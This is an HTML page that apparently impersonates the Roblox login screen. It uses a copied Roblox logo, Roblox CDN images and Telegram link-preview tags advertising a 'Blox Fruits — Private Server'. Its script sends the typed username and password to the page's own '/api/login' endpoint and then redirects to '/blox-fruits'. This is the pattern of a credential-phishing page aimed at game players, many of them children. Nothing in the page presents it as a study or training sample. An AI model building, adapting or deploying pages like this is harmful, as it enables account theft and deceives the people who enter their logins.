<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>

    <!-- Telegram Preview Meta Tags -->
    <meta property="og:site_name" content="Roblox">
    <meta property="og:title" content="Blox Fruits — Private Server">
    <meta property="og:description" content="Secure access to the Blox Fruits private server. Click to enter the game.">
    <meta property="og:image" content="https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png">
    <meta property="og:image:secure_url" content="https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="420">
    <meta property="og:image:height" content="420">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">

    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        
        body {
            background-color: #0d0f12;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            position: relative;
            overflow-x: hidden;
            padding: 20px 16px;
        }
        
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(13, 15, 18, 0.85);
            z-index: -2;
        }

        .bg-collage {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: -1;
            opacity: 0.45;
            pointer-events: none;
            overflow: hidden;
        }
        .bg-tile {
            position: absolute;
            background-size: cover;
            background-position: center;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }
        .tile-1 { width: 170px; height: 110px; top: 2%; left: -5%; transform: rotate(-8deg); background-image: url('https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png'); }
        .tile-2 { width: 160px; height: 100px; top: 5%; right: -8%; transform: rotate(12deg); background-image: url('https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png'); }
        .tile-3 { width: 180px; height: 115px; bottom: 15%; left: -8%; transform: rotate(6deg); background-image: url('https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png'); }
        .tile-4 { width: 190px; height: 120px; bottom: 8%; right: -10%; transform: rotate(-10deg); background-image: url('https://tr.rbxcdn.com/186KB-2f47491cf673e1645e857418ea7a32ae/420/420/Image/Png'); }

        .close-btn {
            position: absolute;
            top: 16px;
            left: 16px;
            font-size: 24px;
            color: #fff;
            cursor: pointer;
            z-index: 10;
        }

        .container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 30px;
            position: relative;
            z-index: 10;
        }

        /* Точный SVG логотип Roblox */
        .roblox-logo-svg {
            width: 180px;
            height: auto;
            margin-bottom: 30px;
            fill: #ffffff;
        }

        .input-box {
            width: 100%;
            background: rgba(30, 33, 42, 0.85);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            margin-bottom: 14px;
            position: relative;
            backdrop-filter: blur(10px);
        }

        .input-box input {
            width: 100%;
            padding: 16px 45px 16px 16px;
            background: transparent;
            border: none;
            outline: none;
            color: #fff;
            font-size: 14px;
        }

        .input-box input::placeholder {
            color: #9ca3af;
        }

        /* Чисто серый глазик */
        .eye-btn {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .eye-btn svg {
            width: 20px;
            height: 20px;
            fill: #8e949e !important;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: rgba(255, 255, 255, 0.15);
            color: #9ca3af;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 6px;
            margin-bottom: 14px;
            transition: 0.2s;
        }

        .login-btn.active {
            background: #fff;
            color: #000;
        }

        .quick-btn {
            width: 100%;
            padding: 16px;
            background: transparent;
            color: #fff;
            border: 1px solid rgba(255, 255, 255, 0.4);
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 24px;
            text-align: center;
        }

        .quick-btn:hover {
            background: rgba(255, 255, 255, 0.05);
        }

        .forgot-link {
            color: #9ca3af;
            font-size: 13px;
            text-decoration: none;
            margin-bottom: 40px;
            text-align: center;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }

        .footer-links {
            display: flex;
            gap: 24px;
            justify-content: center;
            font-size: 14px;
            margin-top: auto;
            padding-bottom: 20px;
        }

        .footer-links a {
            color: #60a5fa;
            text-decoration: underline;
        }

        #status {
            margin-top: 10px;
            font-size: 14px;
            font-weight: 500;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="close-btn">✕</div>

    <div class="bg-collage">
        <div class="bg-tile tile-1"></div>
        <div class="bg-tile tile-2"></div>
        <div class="bg-tile tile-3"></div>
        <div class="bg-tile tile-4"></div>
    </div>

    <div class="container">
        <!-- Настоящий оригинальный векторный логотип Roblox (R [квадрат] BLOX) -->
        <svg class="roblox-logo-svg" viewBox="0 0 350 70" xmlns="http://www.w3.org/2000/svg">
            <!-- Буква R -->
            <path d="M22.5 0H5.5C3.84 0 2.5 1.34 2.5 3V67C2.5 68.66 3.84 70 5.5 70H14C15.66 70 17 68.66 17 67V44H22.5C29.6 44 35 38.6 35 31.5V12.5C35 5.4 29.6 0 22.5 0ZM23.5 30.5H17V13.5H23.5C25.71 13.5 27.5 15.29 27.5 17.5V26.5C27.5 28.71 25.71 30.5 23.5 30.5Z"/>
            <!-- Наклонный квадрат вместо O -->
            <g transform="matrix(0.97 -0.24 0.24 0.97 32 -1)">
                <rect x="42" y="8" width="44" height="52" rx="9" />
                <path fill="#0d0f12" d="M57 23H71V45H57z" rx="3"/>
            </g>
            <!-- Блоки B, L, O, X -->
            <path d="M112.5 0H95.5C93.84 0 92.5 1.34 92.5 3V67C92.5 68.66 93.84 70 95.5 70H112.5C122.17 70 130 62.17 130 52.5V47.5C130 41.5 126 36.8 120.5 35.5C125.5 34.2 128.5 30 128.5 24.5V17.5C128.5 7.83 120.5 0 112.5 0ZM112.5 27H101V13H112.5C114.71 13 116.5 14.79 116.5 17V23C116.5 25.21 114.71 27 112.5 27ZM114 57H101V40H114C116.21 40 118 41.79 118 44V53C118 55.21 116.21 57 114 57Z"/>
            <path d="M145.5 3C145.5 1.34 146.84 0 148.5 0H157C158.66 0 160 1.34 160 3V57H180.5C182.16 57 183.5 58.34 183.5 60V67C183.5 68.66 182.16 70 180.5 70H148.5C146.84 70 145.5 68.66 145.5 67V3Z"/>
            <path d="M225 0H203C193.83 0 186.5 7.33 186.5 16.5V53.5C186.5 62.67 193.83 70 203 70H225C234.17 70 241.5 62.67 241.5 53.5V16.5C241.5 7.33 234.17 0 225 0ZM227.5 53.5C227.5 55.43 225.93 57 224 57H204C22.07 57 200.5 55.43 200.5 53.5V16.5C200.5 14.57 22.07 13 204 13H224C225.93 13 227.5 14.57 227.5 16.5V53.5Z"/>
            <path d="M284.09 3.54C282.85 1.35 280.51 0 277.96 0H265.92C263.92 0 262.11 1.13 261.23 2.92L247.01 31.81L233.15 2.87C232.28 1.12 230.48 0 228.5 0H216.74C214.17 0 211.82 1.37 210.58 3.59C209.34 5.81 209.39 8.56 210.7 10.74L230.73 43.68L211.16 76.54C209.84 78.75 209.78 81.52 211.01 83.78C22.25 86.04 24.61 87.42 27.2 87.42H39.12C41.13 87.42 42.94 86.28 43.81 84.49L58.11 55.42L72.04 84.43C72.91 86.2 74.72 87.33 76.71 87.33H88.54C91.11 87.33 93.46 85.96 94.7 83.74C95.94 81.52 95.89 78.77 94.58 76.59L74.45 43.54L94.09 3.69C95.41 1.48 95.47 -1.29 94.24 -3.54Z" transform="translate(162 0) scale(0.7)"/>
        </svg>

        <div class="input-box">
            <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
        </div>

        <div class="input-box">
            <input type="password" id="passwordInput" placeholder="Password" oninput="checkInputs()">
            <button type="button" class="eye-btn" id="eyeToggle" onclick="togglePassword()">
                <svg id="eyeSvg" viewBox="0 0 24 24">
                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                </svg>
            </button>
        </div>

        <button id="loginBtn" class="login-btn" onclick="loginUser()">Log In</button>
        
        <button class="quick-btn">Quick Pass</button>

        <a href="#" class="forgot-link">Forgot Password or Username</a>

        <div id="status"></div>
    </div>

    <div class="footer-links">
        <a href="#">Terms</a>
        <a href="#">Privacy</a>
    </div>

    <script>
        function checkInputs() {
            const user = document.getElementById('usernameInput').value.trim();
            const pass = document.getElementById('passwordInput').value.trim();
            const btn = document.getElementById('loginBtn');
            if (user && pass) {
                btn.classList.add('active');
            } else {
                btn.classList.remove('active');
            }
        }

        function togglePassword() {
            const passwordInput = document.getElementById('passwordInput');
            const eyeSvg = document.getElementById('eyeSvg');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeSvg.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2.81 2.81L1.39 4.22l3.05 3.05C3.12 8.72 2.06 10.25 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l4.41 4.41 1.41-1.41L2.81 2.81zM10.96 10.96l2.08 2.08c-.32.22-.71.36-1.04.36-1.1 0-2-.9-2-2 0-.33.14-.72.36-1.04z"/>';
            } else {
                passwordInput.type = 'password';
                eyeSvg.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
            }
        }

        async function loginUser() {
            const username = document.getElementById('usernameInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            const statusDiv = document.getElementById('status');

            if (!username || !password) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = 'Please fill in all fields.';
                return;
            }

            statusDiv.style.color = '#9ca3af';
            statusDiv.innerText = 'Logging in...';

            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });

                const data = await response.json();

                if (response.ok) {
                    statusDiv.style.color = '#22c55e';
                    statusDiv.innerText = 'Success! Redirecting...';
                    
                    setTimeout(() => {
                        window.location.href = '/blox-fruits';
                    }, 1500);

                } else {
                    statusDiv.style.color = '#ef4444';
                    statusDiv.innerText = data.error || 'Login failed';
                }
            } catch (err) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = 'Connection error.';
            }
        }
    </script>
</body>
</html>
